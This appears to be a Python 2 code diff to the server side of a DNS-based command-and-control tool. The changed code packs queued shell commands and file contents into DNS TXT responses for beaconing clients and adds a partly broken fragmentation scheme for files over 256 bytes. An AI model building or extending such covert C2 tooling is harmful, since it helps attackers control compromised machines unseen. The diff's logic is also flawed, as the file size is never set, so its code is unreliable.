@@ -19,10 +19,13 @@ class DNSResponse:
         self.addr = addr
         self.packet = None
         self.txt = txt
-        self.commands = server.commands     # commands to execute
-        self.f = server.f   # if file is present
-        self.fName = server.fName   # name of file
+        self.commands = server.commands # commands to execute
+        self.f = server.f               # if file is present
+        self.fName = server.fName       # name of file
+        self.fSize = 0                  # size of file to load
+        self.curr = 0                   # current position in file
         self.server = server
+        self.frag = False               # if the file needs to be fragmented
 
     """
         Packs data into a binary struct to send as a
@@ -33,8 +36,10 @@ class DNSResponse:
     """
     def create_packet(self, url, qID):
         self.packet = struct.pack("!H", qID) # Q ID
-        # Flags = 34240 if sending file (Z bit is being set)
-        self.packet += struct.pack("!H", 34176) # Flags
+        if self.frag:
+            self.packet += struct.pack("!H", 34240) # 34240 if fragment file( Z bit set)
+        else:
+            self.packet += struct.pack("!H", 34176) # Flags
         self.packet += struct.pack("!H", 1) # Questions
         self.packet += struct.pack("!H", 1) # Answers
         self.packet += struct.pack("!H", 0) # Authorities
@@ -71,8 +76,11 @@ class DNSResponse:
         if self.txt:    # load command
             if self.f:
                 self.load_file(self.fName)
-                self.server.f = False
-                self.server.fName = None
+                if self.curr == self.fSize: # read the whole file, reset now
+                    self.frag = False
+                    self.server.f = False
+                    self.server.fName = None
+                    self.curr = 0
             else:
                 full = ';'.join(cmd for cmd in self.commands) # concat commands with semicolon
                 length = len(full)
@@ -92,15 +100,16 @@ class DNSResponse:
     """
     def load_file(self, f):
         f = open(f, 'rb')
-        f.seek(0, 2) # go to end of file
-        size = f.tell() # get size of file
-        f.seek(0) # back to beginning of file
-        self.packet += struct.pack("!H", size + 1) # RDLENGTH(file length) + txt length field
-        self.packet += struct.pack("B", size) # TXT Length(file length)
+        self.packet += struct.pack("!H", self.fSize + 1) # RDLENGTH(file length) + txt length field
+        self.packet += struct.pack("B", self.fSize) # TXT Length(file length)
+        f.seek(self.curr)
         l = f.read(1)
         while l:
+            if self.curr == 256:        # file to big, need to fragment
+                break
             self.packet += struct.pack("c", l) # load each byte of the packet
             l = f.read(1)
+            self.curr += 1
         f.close()
         
 
@@ -115,8 +124,15 @@ class DNSResponse:
 def send_response(addr, server, dnsQuery, txt):
     print "Sending response"
     response = DNSResponse(addr, txt, server)
-    response.create_packet(dnsQuery.fullNames[0], dnsQuery.qID)
-    print addr
-    server.sock.sendto(bytes(response.packet), addr)
+    if response.fSize > 256: 
+        response.frag = True
+        while response.frag:
+            response.create_packet(dnsQuery.fullNames[0], dnsQuery.qID)
+            server.sock.sendto(bytes(response.packet), addr)
+    else:
+        response.create_packet(dnsQuery.fullNames[0], dnsQuery.qID)
+        server.sock.sendto(bytes(response.packet), addr)
+
     if dnsQuery.checkin: server.add_beacon(addr)
+    print addr
     print "Response sent"
